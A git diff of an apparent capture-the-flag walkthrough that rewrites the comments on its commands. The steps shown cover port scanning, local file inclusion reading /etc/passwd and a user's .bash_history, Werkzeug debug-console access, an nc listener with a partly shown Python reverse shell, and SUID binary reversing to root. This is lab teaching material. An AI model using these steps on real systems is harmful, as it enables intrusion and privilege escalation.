@@ -50,8 +50,8 @@ SUID /home/sid/try-harder ? strings empty ? ltrace empty ? objdump
 ## 1. Reconnaissance
 
 ```bash
-# What it does: runs an Nmap scan with the specified ports/scripts/options.
-# Why here: identify exposed services and decide on the next enumeration.
+# What it does: run an Nmap scan to discover open ports and services.
+# Why here: identify the attack surface (Werkzeug on port 5000).
 nmap -sS -p- -n -Pn --min-rate 5000 $TARGET -oA silent
 nmap -sVC -p22,80,5000,23636,36497 $TARGET -oA service
 ```
@@ -69,8 +69,8 @@ The Werkzeug banner is the entire attack surface. See [nmap.md](../../tools/reco
 ## 2. Web Enumeration
 
 ```bash
-# What it does: brute-forces paths, parameters or virtual hosts with a wordlist.
-# Why here: descubrir endpoints ocultos que abren la siguiente fase.
+# What it does: perform directory or parameter brute-forcing with a wordlist.
+# Why here: discover hidden API endpoints or the 'show' parameter used for LFI.
 feroxbuster -u http://$TARGET -w /usr/share/wordlists/dirb/big.txt -x php,html,env,sql,js
 feroxbuster -u http://$TARGET:5000 -w /usr/share/wordlists/seclists/Discovery/Web-Content/api/api-endpoints-res.txt
 ```
@@ -95,8 +95,8 @@ Full technique: [hidden-parameter-fuzzing.md](../../exploits/web-disclosure/hidd
 The current `/api/v2/` route refuses everything we throw at it. Try the legacy route:
 
 ```bash
-# What it does: sends an HTTP request with the chosen method, headers or body.
-# Why here: test or trigger the web behavior described in this step.
+# What it does: send an HTTP request to the target web server.
+# Why here: confirm the LFI vulnerability or read the .bash_history file to recover the PIN.
 curl -s "http://$TARGET:5000/api/v1/resources/books?id=1"
 # returns data ? v1 is still alive
 ```
@@ -104,8 +104,8 @@ curl -s "http://$TARGET:5000/api/v1/resources/books?id=1"
 Brute the parameter name on v1, with the payload pointing at the file we want:
 
 ```bash
-# What it does: brute-forces paths, parameters or virtual hosts with a wordlist.
-# Why here: descubrir endpoints ocultos que abren la siguiente fase.
+# What it does: perform directory or parameter brute-forcing with a wordlist.
+# Why here: discover hidden API endpoints or the 'show' parameter used for LFI.
 ffuf -u "http://$TARGET:5000/api/v1/resources/books?FUZZ=/home/sid/.bash_history" \
   -w /usr/share/wordlists/seclists/Discovery/Web-Content/burp-parameter-names.txt \
   -fs 2 -mc all -fw 11
@@ -119,8 +119,8 @@ ffuf -u "http://$TARGET:5000/api/v1/resources/books?FUZZ=/home/sid/.bash_history
 ## 4. LFI ? Werkzeug Debug PIN
 
 ```bash
-# What it does: sends an HTTP request with the chosen method, headers or body.
-# Why here: test or trigger the web behavior described in this step.
+# What it does: send an HTTP request to the target web server.
+# Why here: confirm the LFI vulnerability or read the .bash_history file to recover the PIN.
 curl -s "http://$TARGET:5000/api/v1/resources/books?show=/etc/passwd"     # confirm
 curl -s "http://$TARGET:5000/api/v1/resources/books?show=/home/sid/.bash_history"
 # ...
@@ -136,8 +136,8 @@ Standard Werkzeug PIN-via-LFI pattern  see [werkzeug-debug-rce.md](../../explo
 Browse to `http://$TARGET:5000/console`, paste `123-321-135`. Python prompt.
 
 ```bash
-# What it does: opens or uses a TCP connection/listener.
-# Why here: receive shell, transfer data or check connectivity.
+# What it does: start a TCP listener on the specified port.
+# Why here: receive the reverse shell from the Flask debugger console.
 nc -lvnp 4444
 ```
 
@@ -147,8 +147,8 @@ import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s
 
 Stabilise:
 ```bash
-# What it does: executes or compiles the script/program with the specified arguments.
-# Why here: launch the necessary exploit or helper in this phase.
+# What it does: execute a script or program with the specified arguments.
+# Why here: perform TTY stabilization or calculate the magic number for the SUID binary.
 python3 -c 'import pty;pty.spawn("/bin/bash")'
 export TERM=xterm
 # Ctrl+Z
@@ -169,8 +169,8 @@ The two leads that mattered:
 # Why here: locate credentials, binaries, configs or writable paths.
 find / -perm -4000 -type f 2>/dev/null
 # /home/sid/try-harder        ? custom SUID, owned by root
-# What it does: lists directory contents.
-# Why here: verificar archivos, permisos o loot en la ruta actual.
+# What it does: list directory contents with permissions.
+# Why here: check the owner and SUID bits of the 'try-harder' binary.
 ls -la /home/sid/try-harder
 # -rwsrwsr-x 1 root sid 8.3K Oct 20  2020 try-harder
 # What it does: identifies file type and metadata.
@@ -195,15 +195,15 @@ The 3-stage funnel:
 strings ./try-harder | grep -iE "magic|number|secret|/bin/"
 # nothing useful  number stored in hex, not ASCII
 
-# What it does: inspecciona comportamiento o desensamblado de un binario.
-# Why here: entender el binario usado para escalar privilegios.
+# What it does: inspect the behavior or disassembly of a binary.
+# Why here: reverse engineer the SUID binary to find the logic for privilege escalation.
 ltrace ./try-harder
 # scanf, puts  no strcmp/memcmp ? comparison is inline ? objdump
 ```
 
 ```bash
-# What it does: inspecciona comportamiento o desensamblado de un binario.
-# Why here: entender el binario usado para escalar privilegios.
+# What it does: inspect the behavior or disassembly of a binary.
+# Why here: reverse engineer the SUID binary to find the logic for privilege escalation.
 objdump -d ./try-harder | awk '/^.*<main>:/,/^$/'
 ```
 
@@ -219,8 +219,8 @@ cmpl  $0x5dcd21f4, -0xc(%rbp)     ; if (mystery == 0x5dcd21f4)
 XOR is its own inverse, so:
 
 ```bash
-# What it does: executes or compiles the script/program with the specified arguments.
-# Why here: launch the necessary exploit or helper in this phase.
+# What it does: execute a script or program with the specified arguments.
+# Why here: perform TTY stabilization or calculate the magic number for the SUID binary.
 python3 -c 'print(0x5dcd21f4 ^ 0x5db3 ^ 0x1116)'
 # 1573454177
 ```
@@ -240,8 +240,8 @@ Tools: [strings](../../tools/reversing/strings.md), [ltrace](../../tools/reversi
 ## 8. Root Flag
 
 ```bash
-# What it does: displays a file in the terminal.
-# Why here: read configuration, credentials, proof or flags.
+# What it does: display the contents of a file.
+# Why here: read flags or sensitive configuration files recovered during the exploitation.
 cat /root/root.txt
 ```
 
